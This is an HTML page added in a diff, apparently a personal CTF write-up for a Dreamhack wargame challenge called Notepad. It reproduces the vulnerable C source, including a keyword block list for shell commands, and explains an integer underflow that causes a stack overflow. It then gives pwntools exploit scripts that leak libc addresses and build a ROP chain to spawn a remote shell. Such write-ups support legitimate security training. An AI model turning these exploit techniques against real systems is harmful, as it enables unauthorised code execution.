@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>milkbomb11</title>
+    <link rel="stylesheet" href="/style.css">
+</head>
+<body>
+
+    <header>
+        <h1>milkbomb11</h1>
+        <a href="/index.html">[to index]</a>
+    </header>
+
+    <main>
+        <p>The problem can be seen <a href="https://dreamhack.io/wargame/challenges/405">here</a>.</p>
+        <p>The source code of the problem is as below.</p>
+        <pre><code>
+//gcc -o Notepad Notepad.c -fno-stack-protector
+#include &lt;stdio.h>
+#include &lt;unistd.h>
+#include &lt;stdlib.h>
+#include &lt;string.h>
+
+void Initalize(){
+   setvbuf(stdin, (char *)NULL, _IONBF, 0);
+   setvbuf(stdout, (char *)NULL, _IONBF, 0);
+   setvbuf(stderr, (char *)NULL, _IONBF, 0);
+}
+
+void main()
+{
+    Initalize();
+
+    puts("Welcome to Dream's Notepad!\n");
+
+    char title[10] = {0,};
+    char content[64] = {0,};
+
+    puts("-----Enter the content-----");
+    read(0, content, sizeof(content) - 1);
+
+    for (int i = 0; content[i] != 0; i++)
+    {
+        if (content[i] == '\n')
+        {
+            content[i] = 0;
+            break;
+        }
+    }
+
+    if(strstr(content, ".") != NULL) {
+        puts("It can't be..");
+        return;
+    }
+    else if(strstr(content, "/") != NULL) {
+        puts("It can't be..");
+        return;
+    }
+    else if(strstr(content, ";") != NULL) {
+        puts("It can't be..");
+        return;
+    }
+    else if(strstr(content, "*") != NULL) {
+        puts("It can't be..");
+        return;
+    }
+    else if(strstr(content, "cat") != NULL) {
+        puts("It can't be..");
+        return;
+    }
+    else if(strstr(content, "echo") != NULL) {
+        puts("It can't be..");
+        return;
+    }
+    else if(strstr(content, "flag") != NULL) {
+        puts("It can't be..");
+        return;
+    }
+    else if(strstr(content, "sh") != NULL) {
+        puts("It can't be..");
+        return;
+    }
+    else if(strstr(content, "bin") != NULL) {
+        puts("It can't be..");
+        return;
+    }
+
+    char tmp[128] = {0,};
+
+    sprintf(tmp, "echo %s > /home/Dnote/note", content);
+    system(tmp);
+    
+    FILE* p = fopen("/home/Dnote/note", "r");
+    unsigned int size = 0;
+    if (p > 0)
+    {
+        fseek(p, 0, SEEK_END);
+        size = ftell(p) + 1;
+        fclose(p);
+        remove("/home/Dnote/note");
+    }
+
+    char message[256];
+    
+    puts("\n-----Leave a message-----");
+    read(0, message, size - 1);
+
+    puts("\nBye Bye!!:-)";
+}
+        </code></pre>
+        <p>
+            If you put a single quote as a input for <code>content</code>, <code>echo %s > /home/Dnote/note</code> returns an error, which causes <code>fopen("/home/Dnote/note", "r")</code>
+            to fail and lets <code>size</code> be 0 when <code>read(0, message, size - 1)</code> is called. An integer underflow on the <code>size</code> field of <code>read</code>
+            happens, allowing you to perform a buffer overflow. I tried inputting <code>$(printf %2048s a)</code> as well but the server didn't allow the creation of a new file.
+            The program has no PIE enabled, no stack cnary, and has partial RELRO, so my first thought was to send an ROP chain.
+            Although the problem did not provide me with a libc, I believed calling <code>system("/bin/sh")</code> was possible 
+            without getting libc's base since <code>system</code> was present in <code>.plt</code> because the program itself used it.
+            So my plan was to call <code>read(0x0, GOT of puts, 0x80)</code> and overwrite the GOT entry of <code>puts</code> with 
+            <code>"/bin/sh"</code> and then call <code>system("/bin/sh")</code>. The ROP chain is as below.
+        </p>
+        <pre><code>
+p.sendafter(b"-----Enter the content-----\n", b"'")
+p.sendafter(b"-----Leave a message-----\n",
+            p64(rdi_gadget) + p64(0x0)
+            + p64(rsi_gadget) + p64(e.got["puts"]) + p64(0x2)
+            + p64(e.plt["read"])
+            + p64(rdi_gadget) + p64(e.got["puts"])
+            + p64(e.plt["system"])
+            ) 
+sleep(0.1)
+p.send("/bin/sh\x00")
+p.interactive()
+        </code></pre>
+        <p>Unfortunately, there was no gadget for <code>%rdi</code> which is why it failed.</p>
+        <p>So instead I leaked the GOT entry of <code>puts</code> and <code>read</code> via <code>puts</code> using ROP and plugged them into  <a href="https://libc.rip/">this site</a> 
+        to get what version of  <code>libc</code> the server was using. With this I was able to obtain the offset of <code>"/bin/sh"</code> within that <code>libc</code>
+        and construct an ROP chain to call <code>system("/bin/sh")</code>.
+        The exploit code is as below. The value <code>0x6f6a0</code> and <code>0x18ce57</code> was the offset of <code>puts</code> and <code>"/bin/sh"</code> 
+        respectively from the base of <code>libc</code> </p>
+        <pre><code>
+#!/usr/bin/python3
+from pwn import *
+
+def ex():
+    #context.log_level = "debug"
+    #p = process("./Notepad")
+    p = remote("host3.dreamhack.games", 22039)
+    e = ELF("./Notepad")
+    rop = ROP(e)
+    print(rop.rdi)
+    print(rop.ret)
+    rdi_gadget = 0x400c73
+    ret_gadget = 0x400709
+    main = 0x400957
+    p.sendafter(b"-----Enter the content-----\n", b"'")
+    p.sendafter(b"-----Leave a message-----\n", 
+                b"A"*480 + b"B"*8
+                + p64(rdi_gadget) + p64(e.got["puts"]) + p64(e.plt["puts"]) 
+                + p64(main)
+                )
+    p.recvuntil(b"Bye Bye!!:-)\n")
+    puts_got_entry = u64(p.recvline().rstrip() + b"\x00"*2)
+
+    p.sendafter(b"-----Enter the content-----\n", b"'")
+    p.sendafter(b"-----Leave a message-----\n", 
+                b"A"*480 + b"B"*8
+                + p64(rdi_gadget) + p64(e.got["read"]) + p64(e.plt["puts"]) 
+                + p64(main)
+                )
+    p.recvuntil(b"Bye Bye!!:-)\n")
+
+    read_got_entry = u64(p.recvline().rstrip() + b"\x00"*2)
+
+    libc_base = puts_got_entry - 0x6f6a0
+    print(f"{puts_got_entry = :x}")
+    print(f"{read_got_entry = :x}")
+    print(f"{libc_base = :x}")
+    binsh = libc_base + 0x18ce57
+    p.sendafter(b"-----Enter the content-----\n", b"'")
+    p.sendafter(b"-----Leave a message-----\n", 
+                b"A"*480 + b"B"*8
+                + p64(ret_gadget)
+                + p64(rdi_gadget) + p64(binsh) + p64(e.plt["system"]))
+    p.interactive()
+
+if __name__ == "__main__": ex()
+        </code></pre>
+
+    </main>
+</body>
+</html>
